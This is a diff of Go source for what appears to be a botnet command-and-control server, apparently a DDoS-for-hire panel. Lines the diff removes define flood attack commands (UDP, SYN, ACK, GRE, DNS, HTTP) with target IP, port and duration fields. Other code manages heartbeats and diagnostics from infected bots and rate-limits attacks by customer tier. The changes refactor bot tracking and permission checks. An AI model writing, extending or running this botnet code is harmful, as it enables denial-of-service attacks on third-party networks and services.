@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bytes"
 	"context"
 	"encoding/binary"
 	"encoding/json"
@@ -9,11 +10,11 @@ import (
 	"os"
 	"path/filepath"
 	"strconv"
+	"strings"
 	"sync"
 	"time"
 )
 
-// Security related types and constants
 type RBACConfig struct {
 	MethodPermissions map[string][]string `json:"method_permissions"`
 }
@@ -24,138 +25,6 @@ var (
 	connectionLimiter = make(chan struct{}, 1000)
 )
 
-type CommandType uint8
-
-const (
-	CmdUDPFlood CommandType = iota
-	CmdUDPSmart
-	CmdTCPFlood
-	CmdSYNFlood
-	CmdACKFlood
-	CmdGREFlood
-	CmdDNS
-	CmdHTTP
-	CmdStop
-	CmdReinstall
-)
-
-type CommandHeader struct {
-	Type     CommandType
-	TargetIP [4]byte
-	Port     uint16
-	Duration uint32
-	Reserved [16]byte
-}
-
-type RateLimitType int
-
-const (
-	RateLimitAuth RateLimitType = iota
-	RateLimitAttack
-	RateLimitAPI
-	RateLimitCommand
-	RateLimitConnection
-)
-
-type RateLimitConfig struct {
-	MaxRequests int
-	Window      time.Duration
-	BlockTime   time.Duration
-}
-
-type RateLimitEntry struct {
-	Count        int
-	FirstSeen    time.Time
-	LastRequest  time.Time
-	BlockedUntil time.Time
-	Lock         sync.Mutex
-}
-
-type RateLimiter struct {
-	limits     map[RateLimitType]RateLimitConfig
-	entries    map[RateLimitType]*BoundedMap // Changed to use BoundedMap
-	globalLock sync.RWMutex
-}
-
-var (
-	rateLimiter *RateLimiter
-)
-
-var defaultRateLimits = map[RateLimitType]RateLimitConfig{
-	RateLimitAuth: {
-		MaxRequests: 3,
-		Window:      5 * time.Minute,
-		BlockTime:   15 * time.Minute,
-	},
-	RateLimitAttack: {
-		MaxRequests: 10,
-		Window:      1 * time.Hour,
-		BlockTime:   30 * time.Minute,
-	},
-	RateLimitAPI: {
-		MaxRequests: 100,
-		Window:      1 * time.Minute,
-		BlockTime:   5 * time.Minute,
-	},
-	RateLimitCommand: {
-		MaxRequests: 50,
-		Window:      1 * time.Minute,
-		BlockTime:   2 * time.Minute,
-	},
-	RateLimitConnection: {
-		MaxRequests: 10,
-		Window:      10 * time.Second,
-		BlockTime:   1 * time.Minute,
-	},
-}
-
-// Telemetry related types
-type LogEntry struct {
-	Timestamp time.Time   `json:"timestamp"`
-	Level     string      `json:"level"`
-	User      string      `json:"user,omitempty"`
-	Action    string      `json:"action"`
-	Details   interface{} `json:"details,omitempty"`
-	IP        string      `json:"ip,omitempty"`
-}
-
-type Logger struct {
-	userLogs   map[string]*os.File
-	logDir     string
-	lock       sync.Mutex
-	systemFile *os.File
-}
-
-var globalLogger *Logger
-
-type DiagnosticPacket struct {
-	Type      uint8
-	OS        [16]byte
-	Arch      [8]byte
-	CPU       [32]byte
-	RAM       uint64
-	Uptime    uint64
-	Timestamp int64
-	Load1     float32
-	Load5     float32
-	Load15    float32
-	DiskUsage uint64
-}
-
-type HeartbeatManager struct {
-	botLastSeen   map[string]time.Time
-	botPingTimes  map[string]time.Duration
-	botStatus     map[string]string
-	heartbeatLock sync.RWMutex
-}
-
-var heartbeatManager = &HeartbeatManager{
-	botLastSeen:  make(map[string]time.Time),
-	botPingTimes: make(map[string]time.Duration),
-	botStatus:    make(map[string]string),
-}
-
-// RBAC Functions
 func LoadRBACConfig() error {
 	file, err := os.ReadFile("data/json/rbac.json")
 	if err != nil {
@@ -206,9 +75,8 @@ func (u *User) CanUseMethod(method string) bool {
 		return false
 	}
 
-	userLevel := u.GetLevel()
 	for _, level := range allowedLevels {
-		if GetLevelFromString(level) <= userLevel {
+		if u.Level == level {
 			return true
 		}
 	}
@@ -275,14 +143,13 @@ func GetUserLevels() []string {
 	return []string{"Owner", "Admin", "Pro", "Basic"}
 }
 
-// Rate Limiting Functions
 func InitRateLimiter() {
 	rateLimiter = &RateLimiter{
 		limits:  defaultRateLimits,
 		entries: make(map[RateLimitType]*BoundedMap),
 	}
 	for limitType := range defaultRateLimits {
-		rateLimiter.entries[limitType] = boundedRateLimitEntries[limitType]
+		rateLimiter.entries[limitType] = NewBoundedMap(MaxRateLimitEntries)
 	}
 	go rateLimiter.cleanupOldEntries()
 }
@@ -299,13 +166,13 @@ func CheckRateLimit(limitType RateLimitType, key string) (bool, time.Duration) {
 	}
 
 	entryMap := rateLimiter.entries[limitType]
-	entryRaw, exists := entryMap.Get(key) // Use Get method instead of direct indexing
+	entryRaw, exists := entryMap.Get(key)
 	if !exists {
 		entry := &RateLimitEntry{
 			FirstSeen:   time.Now(),
 			LastRequest: time.Now(),
 		}
-		entryMap.Set(key, entry) // Use Set method
+		entryMap.Set(key, entry)
 		entryRaw = entry
 	}
 
@@ -341,7 +208,7 @@ func GetRemainingRequests(limitType RateLimitType, key string) int {
 		return -1
 	}
 	entryMap := rateLimiter.entries[limitType]
-	entryRaw, exists := entryMap.Get(key) // Use Get method
+	entryRaw, exists := entryMap.Get(key)
 	if !exists {
 		return config.MaxRequests
 	}
@@ -361,7 +228,7 @@ func ResetRateLimit(limitType RateLimitType, key string) {
 	rateLimiter.globalLock.Lock()
 	defer rateLimiter.globalLock.Unlock()
 	entryMap := rateLimiter.entries[limitType]
-	entryMap.Delete(key) // Use Delete method instead of delete()
+	entryMap.Delete(key)
 }
 
 func SetRateLimitConfig(limitType RateLimitType, config RateLimitConfig) {
@@ -381,7 +248,6 @@ func (rl *RateLimiter) cleanupOldEntries() {
 		rl.globalLock.Lock()
 		now := time.Now()
 		for limitType, entryMap := range rl.entries {
-			// Use Range method instead of direct iteration
 			entryMap.Range(func(key string, value interface{}) bool {
 				entry := value.(*RateLimitEntry)
 				entry.Lock.Lock()
@@ -392,7 +258,6 @@ func (rl *RateLimiter) cleanupOldEntries() {
 				return true
 			})
 
-			// Check if map is empty using Size() instead of len()
 			if entryMap.Size() == 0 {
 				delete(rl.entries, limitType)
 			}
@@ -406,7 +271,6 @@ func (rl *RateLimiter) WithContext(ctx context.Context) {
 		<-ctx.Done()
 		rl.globalLock.Lock()
 		for limitType := range rl.entries {
-			// Create a new BoundedMap instead of regular map
 			rl.entries[limitType] = NewBoundedMap(MaxRateLimitEntries)
 		}
 		rl.globalLock.Unlock()
@@ -456,7 +320,7 @@ func GetRateLimitStats() map[string]interface{} {
 	stats := make(map[string]interface{})
 	for limitType, entryMap := range rateLimiter.entries {
 		typeStats := map[string]interface{}{
-			"active_entries": entryMap.Size(), // Use Size() method
+			"active_entries": entryMap.Size(),
 			"config":         rateLimiter.limits[limitType],
 		}
 		stats[limitType.String()] = typeStats
@@ -471,7 +335,7 @@ func IsCurrentlyBlocked(limitType RateLimitType, key string) bool {
 	rateLimiter.globalLock.RLock()
 	defer rateLimiter.globalLock.RUnlock()
 	entryMap := rateLimiter.entries[limitType]
-	entryRaw, exists := entryMap.Get(key) // Use Get method
+	entryRaw, exists := entryMap.Get(key)
 	if !exists {
 		return false
 	}
@@ -481,7 +345,6 @@ func IsCurrentlyBlocked(limitType RateLimitType, key string) bool {
 	return time.Now().Before(entry.BlockedUntil)
 }
 
-// Logging Functions
 func InitLogger(logDir string) error {
 	globalLogger = &Logger{
 		userLogs: make(map[string]*os.File),
@@ -634,13 +497,12 @@ func LogAPIRequest(user, endpoint, ip string, success bool) {
 	LogUser(level, user, "API_REQUEST", ip, details)
 }
 
-// Diagnostic Functions
 func RequestDiagnostics(conn net.Conn) error {
 	packet := CreatePacket(PacketTypeDiagnostic, []byte{})
 	return SendPacket(conn, packet)
 }
 
-func HandleDiagnosticResponse(conn net.Conn, packet Packet) {
+func HandleDiagnosticResponse(botID string, conn net.Conn, packet Packet) {
 	if len(packet.Payload) < 101 {
 		fmt.Printf("Invalid diagnostic packet size: %d\n", len(packet.Payload))
 		return
@@ -659,111 +521,120 @@ func HandleDiagnosticResponse(conn net.Conn, packet Packet) {
 	load5Str := fmt.Sprintf("%.2f", diag.Load5)
 	load15Str := fmt.Sprintf("%.2f", diag.Load15)
 	diskUsageStr := fmt.Sprintf("%d MB", diag.DiskUsage)
+	clean := func(b []byte) string {
+		return strings.TrimSpace(string(bytes.TrimRight(b, "\x00")))
+	}
+
 	systemInfo := SystemInfo{
-		OS:     string(diag.OS[:]),
-		Arch:   string(diag.Arch[:]),
-		CPU:    string(diag.CPU[:]),
+		OS:     clean(diag.OS[:]),
+		Arch:   clean(diag.Arch[:]),
+		CPU:    clean(diag.CPU[:]),
 		RAM:    fmt.Sprintf("%d MB", diag.RAM),
 		Uptime: fmt.Sprintf("%d seconds", diag.Uptime),
+		Load1:  load1Str,
+		Load5:  load5Str,
+		Load15: load15Str,
+		Disk:   diskUsageStr,
 	}
-	fmt.Printf("Diagnostics from %s: %s %s, %s, %s RAM, %s uptime, Load: %s/%s/%s, Disk: %s\n",
-		conn.RemoteAddr(), systemInfo.OS, systemInfo.Arch,
+
+	UpdateBotInfo(botID, conn.RemoteAddr(), systemInfo)
+
+	fmt.Printf("Diagnostics from %s [%s]: %s %s, %s, %s RAM, %s uptime, Load: %s/%s/%s, Disk: %s\n",
+		conn.RemoteAddr(), botID, systemInfo.OS, systemInfo.Arch,
 		systemInfo.CPU, systemInfo.RAM, systemInfo.Uptime,
 		load1Str, load5Str, load15Str, diskUsageStr)
 }
 
-func ScheduleDiagnosticRequests() {
-	ticker := time.NewTicker(5 * time.Minute)
-	defer ticker.Stop()
+type RateLimitType int
 
-	for range ticker.C {
-		botInfoLock.Lock()
-		for _, botConn := range botConns {
-			go RequestDiagnostics(botConn)
-		}
-		botInfoLock.Unlock()
-	}
+const (
+	RateLimitAuth RateLimitType = iota
+	RateLimitAttack
+	RateLimitAPI
+	RateLimitCommand
+	RateLimitConnection
+)
+
+type RateLimitConfig struct {
+	MaxRequests int
+	Window      time.Duration
+	BlockTime   time.Duration
 }
 
-// Heartbeat Functions
-func (hm *HeartbeatManager) UpdateBotHeartbeat(botID string, pingTime time.Duration) {
-	hm.heartbeatLock.Lock()
-	defer hm.heartbeatLock.Unlock()
-	hm.botLastSeen[botID] = time.Now()
-	hm.botPingTimes[botID] = pingTime
-	if time.Since(hm.botLastSeen[botID]) > 5*time.Minute {
-		hm.botStatus[botID] = "OFFLINE"
-	} else if time.Since(hm.botLastSeen[botID]) > 1*time.Minute {
-		hm.botStatus[botID] = "LAGGING"
-	} else {
-		hm.botStatus[botID] = "ONLINE"
-	}
+type RateLimitEntry struct {
+	Count        int
+	FirstSeen    time.Time
+	LastRequest  time.Time
+	BlockedUntil time.Time
+	Lock         sync.Mutex
 }
 
-func (hm *HeartbeatManager) GetBotStatus(botID string) string {
-	hm.heartbeatLock.RLock()
-	defer hm.heartbeatLock.RUnlock()
-	if status, exists := hm.botStatus[botID]; exists {
-		return status
-	}
-	return "UNKNOWN"
+type RateLimiter struct {
+	limits     map[RateLimitType]RateLimitConfig
+	entries    map[RateLimitType]*BoundedMap
+	globalLock sync.RWMutex
 }
 
-func (hm *HeartbeatManager) GetBotPing(botID string) time.Duration {
-	hm.heartbeatLock.RLock()
-	defer hm.heartbeatLock.RUnlock()
+var (
+	rateLimiter *RateLimiter
+)
 
-	if ping, exists := hm.botPingTimes[botID]; exists {
-		return ping
-	}
-	return 0
+var defaultRateLimits = map[RateLimitType]RateLimitConfig{
+	RateLimitAuth: {
+		MaxRequests: 3,
+		Window:      5 * time.Minute,
+		BlockTime:   15 * time.Minute,
+	},
+	RateLimitAttack: {
+		MaxRequests: 10,
+		Window:      1 * time.Hour,
+		BlockTime:   30 * time.Minute,
+	},
+	RateLimitAPI: {
+		MaxRequests: 100,
+		Window:      1 * time.Minute,
+		BlockTime:   5 * time.Minute,
+	},
+	RateLimitCommand: {
+		MaxRequests: 50,
+		Window:      1 * time.Minute,
+		BlockTime:   2 * time.Minute,
+	},
+	RateLimitConnection: {
+		MaxRequests: 10,
+		Window:      10 * time.Second,
+		BlockTime:   1 * time.Minute,
+	},
 }
 
-func (hm *HeartbeatManager) RemoveBot(botID string) {
-	hm.heartbeatLock.Lock()
-	defer hm.heartbeatLock.Unlock()
-	delete(hm.botLastSeen, botID)
-	delete(hm.botPingTimes, botID)
-	delete(hm.botStatus, botID)
+type LogEntry struct {
+	Timestamp time.Time   `json:"timestamp"`
+	Level     string      `json:"level"`
+	User      string      `json:"user,omitempty"`
+	Action    string      `json:"action"`
+	Details   interface{} `json:"details,omitempty"`
+	IP        string      `json:"ip,omitempty"`
 }
 
-func (hm *HeartbeatManager) GetAllBotsStatus() map[string]string {
-	hm.heartbeatLock.RLock()
-	defer hm.heartbeatLock.RUnlock()
-	statusCopy := make(map[string]string)
-	for k, v := range hm.botStatus {
-		statusCopy[k] = v
-	}
-	return statusCopy
+type Logger struct {
+	userLogs   map[string]*os.File
+	logDir     string
+	lock       sync.Mutex
+	systemFile *os.File
 }
 
-func (hm *HeartbeatManager) CleanupInactiveBots() {
-	hm.heartbeatLock.Lock()
-	defer hm.heartbeatLock.Unlock()
-	for botID, lastSeen := range hm.botLastSeen {
-		if time.Since(lastSeen) > 10*time.Minute {
-			delete(hm.botLastSeen, botID)
-			delete(hm.botPingTimes, botID)
-			delete(hm.botStatus, botID)
-		}
-	}
-}
+var globalLogger *Logger
 
-func StartHeartbeatMonitor() {
-	ticker := time.NewTicker(1 * time.Minute)
-	defer ticker.Stop()
-	for range ticker.C {
-		heartbeatManager.CleanupInactiveBots()
-	}
-}
-
-func HandleBotHeartbeat(conn net.Conn, packet Packet) {
-	var pingTime time.Duration
-	if len(packet.Payload) >= 8 {
-		pingTime = time.Duration(binary.BigEndian.Uint64(packet.Payload[0:8]))
-	}
-	botID := conn.RemoteAddr().String()
-	heartbeatManager.UpdateBotHeartbeat(botID, pingTime)
-	response := CreatePacket(PacketTypeHeartbeat, []byte{})
-	SendPacket(conn, response)
+type DiagnosticPacket struct {
+	Type      uint8
+	OS        [16]byte
+	Arch      [8]byte
+	CPU       [32]byte
+	RAM       uint64
+	Uptime    uint64
+	Timestamp int64
+	Load1     float32
+	Load5     float32
+	Load15    float32
+	DiskUsage uint64
 }
